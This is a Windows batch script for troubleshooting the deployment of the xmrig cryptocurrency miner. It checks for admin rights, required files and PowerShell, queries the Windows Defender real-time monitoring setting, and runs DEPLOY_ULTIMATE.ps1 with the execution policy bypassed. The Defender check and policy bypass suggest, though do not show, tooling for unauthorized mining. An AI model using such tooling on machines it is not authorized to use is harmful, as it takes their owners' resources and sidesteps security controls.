@echo off
title DEBUG - Miner Deployment Troubleshooting
color 0E

echo +==============================================================+
echo |              DEBUG MODE - FIND THE PROBLEM                   |
echo +==============================================================+
echo.

REM Check admin rights
echo [1/5] Checking admin privileges...
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [X] FAILED - Not running as Administrator
    echo.
    echo Please right-click this file and select "Run as administrator"
    echo.
    pause
    exit /b 1
) else (
    echo [OK] PASSED - Running as Administrator
)
echo.

REM Check files
echo [2/5] Checking required files...
if exist "%~dp0DEPLOY_ULTIMATE.ps1" (
    echo [OK] DEPLOY_ULTIMATE.ps1 found
) else (
    echo [X] DEPLOY_ULTIMATE.ps1 MISSING!
    pause
    exit /b 1
)

if exist "%~dp0xmrig.exe" (
    echo [OK] xmrig.exe found
) else (
    echo [X] xmrig.exe MISSING!
    pause
    exit /b 1
)

if exist "%~dp0AUTO_DETECT_DEVICE_TYPE.ps1" (
    echo [OK] AUTO_DETECT_DEVICE_TYPE.ps1 found
) else (
    echo [!]  AUTO_DETECT_DEVICE_TYPE.ps1 missing (optional)
)
echo.

REM Check PowerShell
echo [3/5] Checking PowerShell...
powershell -Command "Write-Host 'PowerShell works!' -ForegroundColor Green"
if %errorLevel% neq 0 (
    echo [X] PowerShell check failed
    pause
    exit /b 1
) else (
    echo [OK] PASSED - PowerShell is working
)
echo.

REM Check Windows Defender status
echo [4/5] Checking Windows Defender...
powershell -Command "Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring" 2>nul
echo.

REM Test script execution
echo [5/5] Testing script execution...
echo.
echo ============================================================
echo Running DEPLOY_ULTIMATE.ps1 with VERBOSE output...
echo Window will stay open to show errors.
echo ============================================================
echo.
pause

REM Run with verbose output and keep window open
powershell.exe -ExecutionPolicy Bypass -NoExit -Command "& { Set-Location '%~dp0'; & '%~dp0DEPLOY_ULTIMATE.ps1' -Verbose }"

echo.
echo Script finished. Check output above for errors.
pause
